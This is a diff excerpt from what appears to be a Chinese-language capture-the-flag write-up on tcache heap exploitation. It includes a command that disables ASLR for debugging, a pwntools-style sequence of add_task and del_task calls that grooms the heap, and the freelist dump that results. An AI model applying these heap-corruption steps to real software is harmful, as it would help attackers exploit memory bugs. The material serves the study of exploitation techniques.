@@ -342,12 +342,12 @@ gdb-peda$ x /30xg 0x00007f1c95e9f620
 调试准备：
 + 关闭ASLR	`echo 0 > /proc/sys/kernel/randomize_va_space`
 + 两个断点`bb 0x141D`  ADD  &  ` bb 0x1521`  delete
+
 ```
 add_task(0, 1, 'test', '1234', 8, 'AAAA')
 add_task(1, 1, 'test', '1234', 8, 'BBBB')
 add_task(2, 1, 'test', '1234', 8, 'CCCC')   # 
 add_task(3, 1, 'test', '1234', 8, 'DDDD')
-
 add_task(4, 1, 'test', '1234', 8, 'EEEE')
 go(2)  
 log.info('Starting')
@@ -358,7 +358,9 @@ del_task(2)  # get the fd to the data
 del_task(3)
 del_task(4)
 ```
+
 删除完之后，得到的tcache_entry链表如下：
+
 ```
 (0x20)   tcache_entry[0](5): 0x5586bd935e40 --> 0x5586bd935be0 --> 0x5586bd935980 --> 0x5586bd935720 --> 0x5586bd9354c0
 (0x80)   tcache_entry[6](5): 0x5586bd935c00 --> 0x5586bd9359a0 --> 0x5586bd935740 --> 0x5586bd9354e0 --> 0x5586bd935280
